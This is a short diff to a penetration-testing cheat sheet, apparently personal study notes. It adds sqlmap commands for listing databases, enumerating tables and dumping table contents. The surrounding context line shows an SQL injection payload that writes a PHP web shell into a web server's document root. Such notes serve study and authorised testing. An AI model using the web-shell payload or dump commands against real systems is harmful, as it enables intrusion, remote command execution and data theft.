@@ -321,6 +321,19 @@ ippsec example (Writing files to disk)
 X' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/x.php'-- -
 ```
 
+### quick sqlmap examples
+
+
+listing databases  
+`sqlmap -r file.req --dbs`
+
+enumerate database using database name  
+`sqlmap -r file.req -D databasename --tables`
+
+enumerate data from table  
+`sqlmap -r file.req -D databasename -T tablename --dump`
+
+
 ### Bruteforcing
 https://github.com/frizb/Hydra-Cheatsheet  
 
